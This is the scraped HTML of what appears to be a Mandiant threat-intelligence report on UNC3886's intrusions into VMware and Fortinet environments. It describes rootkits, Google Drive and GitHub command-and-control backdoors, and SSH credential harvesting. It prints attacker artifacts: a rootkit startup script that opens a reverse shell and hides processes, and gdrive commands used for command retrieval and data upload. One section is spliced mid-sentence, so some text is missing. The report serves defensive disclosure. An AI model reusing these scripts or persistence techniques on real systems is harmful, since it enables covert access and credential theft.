8-5.33V18H4z"></path></svg></a></li></ul></div></div></div></div></div><div><section class="nRhiJb-DARUcf"><div class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: <span style="vertical-align:baseline">Punsaen Boonyakarn, Shawn Chew, Logeswaran Nadarajan, Mathew Potaczek, Jakub Jozwiak, Alex Marvi</span></p>
<hr>
<p> </p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Following the discovery of </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence/"><span style="text-decoration:underline;vertical-align:baseline">malware residing within ESXi hypervisors</span></a><span style="vertical-align:baseline"> in September 2022, Mandiant began investigating numerous intrusions conducted by UNC3886, a suspected China-nexus cyber espionage actor that has targeted prominent strategic organizations on a global scale. In January 2023, Mandiant provided </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/chinese-actors-exploit-fortios-flaw/"><span style="text-decoration:underline;vertical-align:baseline">detailed analysis of the exploitation of a now-patched vulnerability in FortiOS</span></a><span style="vertical-align:baseline"> employed by a threat actor suspected to be UNC3886. In March 2023, we provided details surrounding a custom </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem/"><span style="text-decoration:underline;vertical-align:baseline">malware ecosystem utilized on affected Fortinet devices</span></a><span style="vertical-align:baseline">. Furthermore, the investigation uncovered the </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/chinese-actors-exploit-fortios-flaw/"><span style="text-decoration:underline;vertical-align:baseline">compromise of VMware technologies</span></a><span style="vertical-align:baseline">, which facilitated access to guest virtual machines.</span></p>
<p><span style="vertical-align:baseline">Investigations into more recent operations in 2023 following fixes from the vendors involved in the investigation have corroborated Mandiant's initial observations that the actor operates in a sophisticated, cautious, and evasive nature. Mandiant has observed that UNC3886 employed several layers of organized persistence for redundancy to maintain access to compromised environments over time. Persistence mechanisms encompassed network devices, hypervisors, and virtual machines, ensuring alternative channels remain available even if the primary layer is detected and eliminated.</span></p>
<p><span style="vertical-align:baseline">This blog post discusses UNC3886's intrusion path and subsequent actions that were performed in the environments after compromising the guest virtual machines to achieve access to the critical systems, including:</span></p>
<ul>
<li><span style="vertical-align:baseline">The use of publicly available rootkits for long-term persistence</span></li>
<li><span style="vertical-align:baseline">Deployment of malware that leveraged trusted third-party services for command and control (C2 or C&amp;C)</span></li>
<li><span style="vertical-align:baseline">Subverting access and collecting credentials with Secure Shell (SSH) backdoors</span></li>
<li><span style="vertical-align:baseline">Extracting credentials from TACACS+ authentication using custom malware </span></li>
</ul>
<p><span style="vertical-align:baseline">Mandiant has published </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-detection-hardening/"><span style="text-decoration:underline;vertical-align:baseline">detection and hardening guidelines for ESXi hypervisors</span></a><span style="vertical-align:baseline"> and </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening/"><span style="text-decoration:underline;vertical-align:baseline">attack techniques employed by UNC3886</span></a><span style="vertical-align:baseline">. For Google SecOps Enterpri</span><span style="vertical-align:baseline">se+ customers, rules hav</span><span style="vertical-align:baseline">e been released to your </span><a href="https://cloud.google.com/chronicle/docs/preview/curated-detections/windows-threats-category"><span style="text-decoration:underline;vertical-align:baseline">Emerging Threats</span></a><span style="vertical-align:baseline"> rule pack, and indicators of compromise (IOCs) listed in this blog post are available for prioritization with </span><a href="https://cloud.google.com/chronicle/docs/detection"><span style="text-decoration:underline;vertical-align:baseline">Applied Threat Intelligence</span></a><span style="vertical-align:baseline">. Mandiant recommends that organizations follow the security recommendations within the </span><a href="https://core.vmware.com/vsphere-esxi-mandiant-malware-persistence" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">VMware</span></a><span style="vertical-align:baseline"> and </span><span style="vertical-align:baseline"><a href="https://www.fortiguard.com/psirt/FG-IR-22-369" rel="noopener" target="_blank">Fortinet</a> advisories</span><span style="vertical-align:baseline"> and the security recommendations provided in this blog post.</span></p>
<h2><span style="vertical-align:baseline">Zero-Day Exploitation</span></h2>
<p><span style="vertical-align:baseline">In January 2024, Mandiant published a blog post detailing </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/chinese-vmware-exploitation-since-2021/"><span style="text-decoration:underline;vertical-align:baseline">UNC3886's activities exploiting CVE-2023-34048</span></a><span style="vertical-align:baseline"> (VMware vCenter) since late 2021. The exploitation enables unauthenticated remote command execution on vulnerable vCenter servers. Mandiant observed deployment of attacker backdoors minutes after crashing of the vulnerable VMware service.</span></p>
<p><span style="vertical-align:baseline">CVE-2023-34048 was not the only zero-day vulnerability exploited by UNC3886 during these intrusions. The threat actor exploited three other zero-day vulnerabilities, which have since been patched, to gain access when obtaining and abusing credentials of existing accounts was infeasible. Figure 1 describes the UNC3886 attack path involving the following zero-day exploitations:</span></p>
<ul>
<li><span style="vertical-align:baseline">CVE-2022-41328 in FortiOS was exploited to download and execute backdoors on FortiGate devices.</span></li>
<li><span style="vertical-align:baseline">CVE-2022-22948 in VMware vCenter was exploited to obtain encrypted credentials in the vCenter's postgresDB for further access.</span></li>
<li><span style="vertical-align:baseline">CVE-2023-20867</span><span style="vertical-align:baseline"> in VMware Tools was exploited to execute unauthenticated Guest Operations from ESXi host to guest virtual machines.</span></li>
</ul></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig1.max-2200x2200.jpg" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig1.max-2200x2200.jpg" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig1.max-2200x2200.jpg" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig1.max-2200x2200.jpg" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 1: UNC3886 attack path diagram</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Mandiant observed the threat actor exploit CVE-2022-42475 in FortiOS's Secure Sockets Layer (SSL) virtual private network (VPN) to obtain access in January 2023 after details of the vulnerability had been made public by Fortinet as part of their </span><a href="https://www.fortiguard.com/psirt_policy" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">vulnerability disclosure processes</span></a><span style="vertical-align:baseline">. CVE-2022-42475 allows a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.</span></p>
<h2><span style="vertical-align:baseline">Use of Publicly Available Rootkits for Long-Term Persistence</span></h2>
<p><span style="vertical-align:baseline">After exploiting zero-day vulnerabilities to gain access to vCenter servers and subsequently managed ESXi servers, the actor obtained total control of guest virtual machines that shared the same ESXi server as the vCenter server. Mandiant observed the actor use two publicly available rootkits, REPTILE and MEDUSA, on the guest virtual machines to maintain access and evade detection.</span></p>
<h3><span style="vertical-align:baseline">REPTILE</span></h3>
<p><span style="vertical-align:baseline">REPTILE is an open-source Linux rootkit, implemented as a loadable kernel module (LKM), that provides backdoor access to a system. The rootkit and backdoor functionalities are implemented as a separate component identified by Mandiant as follows:</span></p>
<ul>
<li><span style="vertical-align:baseline">REPTILE.CMD is a user-mode component responsible for communicating with the kernel-mode component to perform actions including hiding files, processes, and network connections.</span></li>
<li><span style="vertical-align:baseline">REPTILE.SHELL is a reverse shell backdoor running in user-mode. The component could be configured to listen for a specialized packet in TCP, UDP, or ICMP for activation.</span></li>
<li><span style="vertical-align:baseline">REPTILE kernel-level component is an LKM responsible for hooking kernel functions and modifying functions data as tasked by REPTILE.CMD to achieve rootkit functionality.</span></li>
<li><span style="vertical-align:baseline">REPTILE LKM launcher is responsible for decrypting the actual kernel module code from the file and loading into the memory.</span></li>
</ul>
<p><span style="vertical-align:baseline">REPTILE appeared to be the rootkit of choice by UNC3886 as it was observed being deployed immediately after gaining access to compromised endpoints. REPTILE offers both the common backdoor functionality, such as command execution and file transfer capabilities, as well as stealth functionality that enables the threat actor to evasively access and control the infected endpoints via port knocking.</span></p>
<p><span style="vertical-align:baseline">Mandiant observed that UNC3886 introduced several changes into the REPTILE code base and its auxiliary components. Some changes are based on the REPTILE code base before version 2.1, which was introduced on March 1, 2020, potentially indicating the actor has been developing and/or operating this rootkit for some time. </span></p>
<p><span style="vertical-align:baseline">One such change was identified within the UNC3886 REPTILE LKM launcher. In REPTILE version 2.0, the original developer of REPTILE altered how the kernel-level component is loaded, switching from using </span><code style="vertical-align:baseline">insmod</code><span style="vertical-align:baseline"> to a </span><a href="https://github.com/f0rb1dd3n/Reptile/blob/965dc73bef36877574a43523fe1b7ec55c52cd9f/loader.c" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">custom launcher</span></a><span style="vertical-align:baseline">. The launcher Mandiant observed UNC3886 use throughout their operations, based on the custom launcher, was updated with a new function to daemonize a process. This function is identical to the publicly available </span><a href="https://github.com/NorthWardTop/posix/blob/master/process/create_daemon.c" rel="noopener" target="_blank"><code style="text-decoration:underline;vertical-align:baseline">create_daemon.c</code></a><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">UNC3886 automated the deployment of REPTILE components with shell scripts. These scripts contained similar code to </span><a href="https://github.com/f0rb1dd3n/Reptile/blob/965dc73bef36877574a43523fe1b7ec55c52cd9f/setup.sh" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">the installation script</span></a><span style="vertical-align:baseline"> responsible for building REPTILE components and configuring a persistence mechanism for the REPTILE kernel-level component. The following additions were observed in the deployment shell script, which resulted in the creation of different forensic artifacts from the original REPTILE:</span></p>
<ol>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline">The threat actor replaced every instance of "reptile" with a unique keyword, which resulted in different filenames for rootkit component files.<br><br></span></span>
<div align="left">

<span style="vertical-align:baseline"><br></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline">The script only deploys the pre-built REPTILE components and files to the paths listed as follows, and configures persistence mechanisms; it does not build the components.</span></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline">While the original REPTILE relies on </span><a href="https://github.com/f0rb1dd3n/Reptile/blob/965dc73bef36877574a43523fe1b7ec55c52cd9f/setup.sh#L278" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">modprobe</span></a><span style="vertical-align:baseline"> and </span><a href="https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/scripts/installer.sh#L12" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">udev</span></a><span style="vertical-align:baseline"> in newer versions to load the kernel-level component, UNC3886 REPTILE relies on creating new RC scripts or systemd unit files with a command to execute REPTILE LKM launcher to load the kernel-level component, presented as follows. Only a few REPTILE samples were observed using </span><code style="vertical-align:baseline">udev</code><span style="vertical-align:baseline"> as a persistence mechanism.</span></span></li>
</ol></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/usr/bin/&lt; /lib/modules/&lt;kernel_version&gt;/kernel/drivers/
&lt;unique_keyword&gt;/&lt;unique_keyword&gt; 2&gt;&amp;- 1&gt;&amp;- 0&lt;&amp;-</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Aside from the modifications made to the deployment shell script by the threat actor, the threat actor introduced a startup script containing execution commands and parameters for REPTILE.CMD and REPTILE.SHELL. The following is a sample of the startup script identified from one of the compromised guest virtual machines.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>#!/bin/bash
#&lt;Centos_Selinux_Config_And_Module&gt;
/var/lib/fwupdd/&lt;unique_keyword&gt;_reverse -t &lt;ip_address&gt; 
-p &lt;port&gt; -s &lt;secret&gt; -r &lt;seconds&gt;
/var/lib/fwupdd/&lt;unique_keyword&gt;_cmd hide `ps -ef | grep 
&quot;ata/0&quot; | grep -v grep | awk &#39;{print $2}&#39;`
/var/lib/fwupdd/&lt;unique_keyword&gt;_cmd file-tampering
#&lt;/Centos_Selinux_Config_And_Module&gt;
</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The startup script tasks REPTILE.SHELL to connect back to the command-and-control (C2 or C&amp;C) server and later configures REPTILE.CMD to hide the REPTILE.SHELL process from a process listing result and hide files from being visible. The analysis of the REPTILE samples revealed that the REPTILE.CMD was developed to hide file contents enclosed with a string </span><code style="vertical-align:baseline">#&lt;/Centos_Selinux_Config_And_Module&gt;</code><span style="vertical-align:baseline"> when the component is executed with a </span><code style="vertical-align:baseline">file-tampering</code><span style="vertical-align:baseline"> parameter.</span></p>
<p><span style="vertical-align:baseline">Mandiant identified a customized sample of REPTILE listeners with Transport Layer Security (TLS) support. The sample is able to receive communications using TLS over raw Transmission Control Protocol (TCP). Mandiant observed the threat actor deployed the customized version of REPTILE along with the victim's legitimate TLS certificate and private key obtained from the compromised FortiGate devices.</span></p>
<p><span style="vertical-align:baseline">While UNC3886 was observed deploying new rootkits and backdoors with more functionalities, REPTILE appeared to be the first option to establish a foothold and possibly the last resort for maintaining access due to its small footprints.</span></p>
<h3><span style="vertical-align:baseline">MEDUSA and SEAELF</span></h3>
<p><span style="vertical-align:baseline">MEDUSA is </span><a href="https://github.com/ldpreload/Medusa" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">an open-source rootkit implementing dynamic linker hijacking via LD_PRELOAD</span></a><span style="vertical-align:baseline">. Unlike REPTILE, which only provides an interactive access with rootkit functionalities, MEDUSA exhibits capabilities of logging user credentials from the successful authentications, either locally or remotely, and command executions. These capabilities are advantageous to UNC3886 as their modus operandi to move laterally using valid credentials.</span></p>
<p><span style="vertical-align:baseline">Mandiant assessed the use of MEDUSA to be experimental alternatives of REPTILE and SSH keyloggers. The adoption of REPTILE was usually observed after the threat actor successfully gained access to compromised endpoints where it was used to deploy other malware, keyloggers, and utilities. MEDUSA, however, has been deployed subsequently on the same compromised endpoints in more recent activities.</span></p>
<p><span style="vertical-align:baseline">Deployment of MEDUSA was accomplished by the </span><a href="https://github.com/ldpreload/Medusa/blob/main/src/rkload.c" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">MEDUSA installer component</span></a><span style="vertical-align:baseline">, identified by Mandiant as SEAELF. Mandiant identified two versions of MEDUSA deployed in the compromised endpoints, both using </span><code style="vertical-align:baseline">0xAA</code><span style="vertical-align:baseline"> as the XOR encryption key to encrypt configuration strings. Mandiant FLARE observed the following changes made by the threat actor to the samples:</span></p>
<ol>
<li><span style="vertical-align:baseline">The </span><code style="vertical-align:baseline">execve</code><span style="vertical-align:baseline"> function that would normally filter output from </span><code style="vertical-align:baseline">iptables</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">ip</code><span style="vertical-align:baseline">, and the </span><code style="vertical-align:baseline">/bin</code><span style="vertical-align:baseline"> directory no longer filter such output.</span></li>
<li><span style="vertical-align:baseline">Output from </span><code style="vertical-align:baseline">strace</code><span style="vertical-align:baseline">, when executed by </span><code style="vertical-align:baseline">execve</code><span style="vertical-align:baseline">, is redirected to </span><code style="vertical-align:baseline">/tmp/orbit.txt</code><span style="vertical-align:baseline"> by appending </span><code style="vertical-align:baseline">-o /tmp/orbit.txt</code><span style="vertical-align:baseline"> to the command line.</span></li>
<li><span style="vertical-align:baseline">The PAM functions no longer report SSH information and disrupt sudo requests by always returning </span><code style="vertical-align:baseline">PAM_SUCCESS(0)</code><span style="vertical-align:baseline">. </span></li>
<li><span style="vertical-align:baseline">The following hook functions are missing in the sample:</span>
<ol style="list-style-type:lower-alpha">
<li><code style="vertical-align:baseline">hosts_access</code></li>
<li><code style="vertical-align:baseline">shutdown</code></li>
<li><code style="vertical-align:baseline">close</code></li>
<li><code style="vertical-align:baseline">pam_acct_mgmt</code></li>
<li><code style="vertical-align:baseline">pam_sm_authenticate</code></li>
<li><code style="vertical-align:baseline">xread</code></li>
</ol>
</li>
</ol>
<p><span style="vertical-align:baseline">Moreover, the file system evidence indicated changes to the MEDUSA configuration in one version that resulted in the creation and presence of various MEDUSA artifacts and host-based indicator locations as presented in the following table.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><div align="left">

</div></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Mandiant observed the threat actor deploying and executing tools via MEDUSA to capture SSH valid credentials from the compromised endpoints. Upon starting, MEDUSA was configured to execute commands and executables listed under </span><code style="vertical-align:baseline">/usr/lib/locate/.boot.sh</code><span style="vertical-align:baseline"> as follows:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/usr/sbin/libvird
/usr/bin/NetworkManage
chcon -t sshd_tmp_t /var/run/cron.data</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The executables and the command constitute a component of the threat actor's attempt to hijack SSH connections with the objective of acquiring SSH credentials. Analysis of the executables and their attempts is discussed later in this report.</span></p>
<h2><span style="vertical-align:baseline">Malware Leveraging Trusted Third Parties as C2 Channel</span></h2>
<p><span style="vertical-align:baseline">The threat actor was observed deploying malware, including MOPSLED and RIFLESPINE, that leverages trusted third parties like GitHub and Google Drive as C2 channels while relying on the rootkits for persistence.</span></p>
<h3><span style="vertical-align:baseline">MOPSLED</span></h3>
<p><span style="vertical-align:baseline">MOPSLED is a shellcode-based modular backdoor that has the capability to communicate over HTTP or a custom binary protocol over TCP to its C2 server. The core functionality of MOPSLED involves expanding its capabilities by retrieving plugins from the C2 server. MOPSLED also uses a custom ChaCha20 encryption algorithm to decrypt embedded and external configuration files.</span></p>
<p><span style="vertical-align:baseline">Mandiant observed sharing of MOPSLED between other Chinese cyber espionage groups including APT41. Mandiant considered MOPSLED to be an evolution of CROSSWALK, which can act as a network proxy.</span></p>
<p><span style="vertical-align:baseline">Mandiant observed UNC3886 deploy the Linux variant, identified as MOPSLED.LINUX, on vCenter servers and a small number of the compromised endpoints where REPTILE already existed. MOPSLED.LINUX appeared to be used only as an initial malware deployed after gaining successful access since the malware does not have rootkit-like capabilities that could evade detection.</span></p>
<p><span style="vertical-align:baseline">MOPSLED.LINUX was developed to communicate with a dead-drop URL to retrieve an actual C2 address. The sample associated with UNC3886 was observed sending HTTP GET requests to </span><code style="vertical-align:baseline">https://cyberponke.github[.]io/*</code><span style="vertical-align:baseline">. The response was decrypted using the ChaCha20 cipher to obtain the actual C2 IP address. Further communications are implemented as a custom binary protocol similar to HTTP/S.</span></p>
<h3><span style="vertical-align:baseline">RIFLESPINE</span></h3>
<p><span style="vertical-align:baseline">RIFLESPINE is a cross-platform backdoor that leverages Google Drive to transfer files and execute commands. It adopts the CryptoPP library to implement the AES algorithm to encrypt and decrypt the data transmitted between an affected machine and the threat actor.</span></p>
<p><span style="vertical-align:baseline">To instruct RIFLESPINE, the threat actor creates an encrypted file on Google Drive with instructions for RIFLESPINE that is then executed by the malware on the target endpoint. The target endpoint's MAC address must appear in the filename when it is created. The file is downloaded, RIFLESPINE downloads and decrypts the file, and executes the instructions. The executions' outputs will be encrypted, stored in a temporary file, and then uploaded to Google Drive once more. The following instructions are available for execution:</span></p>
<ol>
<li><span style="vertical-align:baseline">Download file with </span><code style="vertical-align:baseline">get</code><span style="vertical-align:baseline"> command.</span></li>
<li><span style="vertical-align:baseline">Upload file with </span><code style="vertical-align:baseline">put</code><span style="vertical-align:baseline"> command.</span></li>
<li><span style="vertical-align:baseline">Set next call out time in milliseconds with </span><code style="vertical-align:baseline">settime.</code></li>
<li><span style="vertical-align:baseline">Execution arbitrary commands with </span><code style="vertical-align:baseline">/bin/sh.</code></li>
</ol>
<p><span style="vertical-align:baseline">UNC3886 deployed RIFLESPINE with </span><a href="https://github.com/prasmussen/gdrive" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">an open-source Google Drive CLI client</span></a><span style="vertical-align:baseline">. A systemd service file was created and used to execute the malware as the malware does not contain a persistence mechanism. Upon first installation, the malware collects system information and starts communicating with Google Drive service with the following steps:</span></p>
<ol>
<li><span style="vertical-align:baseline">Execute </span><code style="vertical-align:baseline">gdrive</code><span style="vertical-align:baseline"> to obtain the file pertinent to the target endpoint with the following command:<br><br></span>
<pre><code>gdrive --refresh-token &lt;token&gt; list | grep &quot;2@&lt;mac_address&gt;&quot;</code></pre>
</li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline">Write the filename to a temporary file </span><code style="vertical-align:baseline">/tmp/syslog&lt;random_number.rs.</code></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline">Download file to </span><code style="vertical-align:baseline">/tmp</code><span style="vertical-align:baseline"> matching the filename with the following command:<br><br></span></span>
<pre><code>gdrive --refresh-token &lt;token&gt; download --path &quot;/tmp&quot; -f</code></pre>
</li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Decrypt file </span><code style="vertical-align:baseline">/tmp/&lt;filename&gt;</code><span style="vertical-align:baseline"> to </span><code style="vertical-align:baseline">/tmp/&lt;download_filename&gt;.de</code><span style="vertical-align:baseline"> using CryptoPP AES-CBC with key </span><code style="vertical-align:baseline">libcrypt.so.2</code><span style="vertical-align:baseline"> and IV </span><code style="vertical-align:baseline">libev.so.5.</code></span></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Read </span><code style="vertical-align:baseline">/tmp/&lt;download_filename&gt;.de</code><span style="vertical-align:baseline"> line by line for instructions to execute.</span></span></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">After executing the instructions, write output to </span><code style="vertical-align:baseline">/tmp/update&lt;random_number&gt;.tmp.</code></span></span></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Encrypt response from </span><code style="vertical-align:baseline">/tmp/update&lt;random_number.tmp</code><span style="vertical-align:baseline"> to </span><code style="vertical-align:baseline">/tmp/update&lt;random_number&gt;.tmp.en</code><span style="vertical-align:baseline"> using the same AES keys as decryption.</span></span></span></span></li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Upload encrypted response with the following command:<br><br></span></span></span></span></span>
<pre><code>gdrive --refresh-token &lt;token&gt; upload --name &quot;/tmp
/update&lt;random_number&gt;.tmp.en&quot;</code></pre>
</li>
<li><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Delay and repeat the previous steps.</span></span></span></span></li>
</ol>
<p><span style="vertical-align:baseline">Similar to MOPSLED.LINUX, RIFLESPINE was observed only in a small number of the compromised virtual machines. It is reasonable to assume that the threat actor abandoned the idea of using MOPSLED.LINUX and RIFLESPINE, which do not have rootkit functionality, as backdoors because predictable communications to GitHub and Google Drive services from virtual machine servers, rather than workstations, could raise suspicions.</span></p>
<h2><span style="vertical-align:baseline">Subverting Accesses With Backdoored Applications</span></h2>
<p><span style="vertical-align:baseline">Mandiant observed UNC3886 relying heavily on collecting and utilizing valid credentials for lateral movement between guest virtual machines running on the compromised VMware ESXi. The following section describes different techniques used by the threat actor to collect and abuse valid credentials.</span></p>
<h3><span style="vertical-align:baseline">Backdoored SSH Executables</span></h3>
<p><span style="vertical-align:baseline">After gaining access to the guest virtual machines, either through the collection of </span><code style="vertical-align:baseline">vpxuser</code><span style="vertical-align:baseline"> credentials or by exploiting CVE-2023-20867 in conjunction with VMware Guest Operations abuse to facilitate malicious file transfer and execution, UNC3886 was observed deploying backdoored SSH clients and daemons. The purpose of these malicious components was the interception and collection of credentials within an XOR-encrypted text file.</span></p>
<p><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline"><span style="vertical-align:baseline">Analysis of the compromised SSH client located at </span><code style="vertical-align:baseline">/usr/bin/ssh</code><span style="vertical-align:baseline"> exposed modifications by the threat actor to the </span><code style="vertical-align:baseline">userauth_passwd()</code><span style="vertical-align:baseline"> function, which governs password-based authentication. These modifications (detailed in Figure 2) introduce instructions designed to harvest SSH credentials from outgoing connections. The credentials are then XORed with </span><code style="vertical-align:baseline">0xef</code><span style="vertical-align:baseline"> before storage in the file </span><code style="vertical-align:baseline">/var/log/ldapd&lt;unique_keyword&gt;.2.gz</code><span style="vertical-align:baseline">.</span></span></span></span></p></span></section><section These modifications were specifically implemented within the </span><code style="vertical-align:baseline">auth_password()</code><span style="vertical-align:baseline"> function, responsible for managing password-based authentication within the SSH daemon, and the </span><code style="vertical-align:baseline">sshpam_auth_passwd()</code><span style="vertical-align:baseline"> function, which facilitates integration with Pluggable Authentication Modules (PAM). The injected malicious code functions analogously to that observed within the SSH client. However, in this instance, harvested credentials are stored within the file </span><code style="vertical-align:baseline">/var/log/ldapd&lt;unique_keyword&gt;.1.gz</code><span class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 4: Backdoored sshpam_auth_passwd() function</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">In more recent threat actor activities, Mandiant observed the threat actor installed </span><code style="vertical-align:baseline">yum-versionlock</code><span style="vertical-align:baseline"> to ensure that the malicious SSH clients and daemons would survive package upgrades. </span><code style="vertical-align:baseline">yum-versionlock</code><span style="vertical-align:baseline"> enables the threat actor to exclude OpenSSH-related packages from the upgrade by adding the current version of OpenSSH packages to 